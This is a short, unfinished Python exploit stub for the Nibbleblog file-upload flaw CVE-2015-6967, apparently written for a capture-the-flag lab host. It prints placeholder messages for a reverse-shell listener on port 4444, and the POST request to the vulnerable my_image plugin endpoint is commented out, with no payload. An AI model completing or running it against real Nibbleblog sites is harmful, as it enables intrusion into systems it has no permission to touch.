#!/usr/bin/python
import requests
import argparse

class NibbleExploit:

    __cve = "CVE-2015-6967"
    __description = ""

    def __init__(self):
        """ Load Exploit """
        print("Initialising {0}".format(self.__cve))

    def listener(self, local_port, local_ip):
        """ Load listener object """
        x = ShellListener()
        host = "{protocol}://{0}:{1}".format(local_ip, local_port, protocol="http")
        x.run(host)

class ShellListener:

    __ip_address = "0.0.0.0"
    __port_number = 0

    def __init__(self):
        """ Load Listener """
        print("Initialising Listener")
    
    def run(self, listener_address):
        """ Set Listener to Run """
        print("Running listener on {0}".format(listener_address))

def main():
    """ Parse Args 
    parser = argparse.ArgumentParser()
    parser.add_argument
    parser.parse_args()
    """
    """ Init Exploit """
    exploit = NibbleExploit()
    listener = exploit.listener(
        local_port = 4444,
        local_ip = "192.168.0.1"
    )
    """
    payload = {  }
    r = requests.post('http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image')
    post
    """

if __name__ == "__main__":
    main()